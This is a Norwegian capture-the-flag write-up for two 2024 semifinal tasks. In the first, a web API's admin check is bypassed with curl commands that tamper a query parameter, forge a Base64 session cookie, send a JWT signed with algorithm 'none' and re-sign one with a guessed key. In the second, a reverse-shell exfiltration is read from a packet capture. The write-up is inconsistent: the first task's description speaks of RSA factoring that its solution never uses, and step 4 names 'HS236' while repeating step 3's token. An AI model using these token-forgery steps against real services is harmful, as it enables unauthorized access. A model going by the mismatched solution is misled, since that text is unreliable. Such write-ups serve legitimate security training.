# Cyberlandslaget Semifinale 2024

## SHAMROCK4

### Oppgave

Oppgaven gir et flagg kryptert med en variasjon av RSA. Målet blir å finne `p` og `q`, som er faktorer vi må ha for å løse opp kryptoen, der vi er gitt `n`. 

### Løsning

1. Endrer parameter i get request fra [`?admin=false`](https://shamrock4.sf24.no/api/endpoint1?admin=false) til [`?admin=true`](https://shamrock4.sf24.no/api/endpoint1?admin=true).

```bash
curl "https://shamrock4.sf24.no/api/endpoint1?admin=true"
# d7d31d74dd0f522068c0847e24b6d3ecca760a7bbc562501cd74b4897d5c8db7
```

2. Bruker [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9_.',true,false)Find_/_Replace(%7B'option':'Regex','string':'false'%7D,'true',true,false,true,false)To_Base64('A-Za-z0-9%2B/%3D')&input=ZXlBaVlXUnRhVzRpT2lCbVlXeHpaU0I5) for å dekode Base64 og endre `admin: false` til `admin: true`. Enkoder så tilbake til Base64.

Den nye strengen kan nå brukes til å autentisere innloggingen. Til dette brukte jeg CURL:
```bash
curl "https://shamrock4.sf24.no/api/endpoint2" -b "session_api2=eyAiYWRtaW4iOiB0cnVlIH0="

# d1402a40665a5a2beaa926f40e4f09f85e2786d077b0d528b0934f3b5012418e
```

3. Bruker [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Decode()Find_/_Replace(%7B'option':'Regex','string':'false'%7D,'true',true,false,true,false)JWT_Sign('','None')&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmhaRzFwYmlJNlptRnNjMlY5Lk1sU1plU1J0ZDhBQmZNZlBKbnJjWGlaZ1VkQlZ5QXpHalhweHlaTldGbEE) for å dekode JWT-token og endre `admin: false` til `admin: true`. Enkoder tilbake til JWT-token med `algorithm: none`

```bash
curl "https://shamrock4.sf24.no/api/endpoint3" -H "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSld
UIn0.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzI0ODQ0MTQyfQ."
# 11c8c2d0cf65f31bb375c94ac58b45b720379162331798996f5c378e4a848c9e
```

4. Bruker [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Decode()Find_/_Replace(%7B'option':'Regex','string':'false'%7D,'true',true,false,true,false)JWT_Sign('james','HS256')&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmxiblpwY205dWJXVnVkQ0k2SW1SbGRpSXNJblZ6WlhKdVlXMWxJam9pYW1GdFpYTWlMQ0poWkcxcGJpSTZabUZzYzJVc0luTnBaMjVyWlhrdGJtOTBaU0k2SW5WelpYSnVZVzFsSUdseklHOXJJR2x1SUdSbGRpQmxiblpwY205dWJXVnVkQ3dnWW5WMElIVnpaU0IyWVd4cFpDQnpaV055WlhRZ2EyVjVJR2x1SUhCeWIyUjFZM1JwYjI0aWZRLnBSbEhhZWNTWFBpTTNkeWR4V2o3Ti1kYWhtdDV3WEZZbWl3OHlRcHRKdHM) for å dekode JWT-token og endre `admin: false` til `admin: true`. Enkoder tilbake til JWT-token med `algorithm: HS236` med key `james`

```bash
curl "https://shamrock4.sf24.no/api/endpoint3" -H "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSld
UIn0.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzI0ODQ0MTQyfQ."
# 441dc7d00f11ab62016c58b2b024abcf850229bdc9c106ef2389f50454fe77da
```


<details>
<summary>Flagg</summary>

`flag{hvis_n_kan_faktoreres_blir_det_problemer}`
</details>



## SUS

### Oppgave

Oppgaven gir en PCAP med en ukryptert forbindelse mellom en klient og en server.

### Løsning

Vi kan lese meldingene i forbindelsen ved å se på dataen i pakkene. Vi leter oss kjapt fram til kommandoen som etterspør `flag.txt` og responsen: `U0YyNHtyM3YzcnMzX3NoM2xsX2ludDBfM3hmMWx9`

Dekoder vi dette fra Base64 finner vi flagget.

<details>
<summary>Flagg</summary>

`SF24{r3v3rs3_sh3ll_int0_3xf1l}`
</details>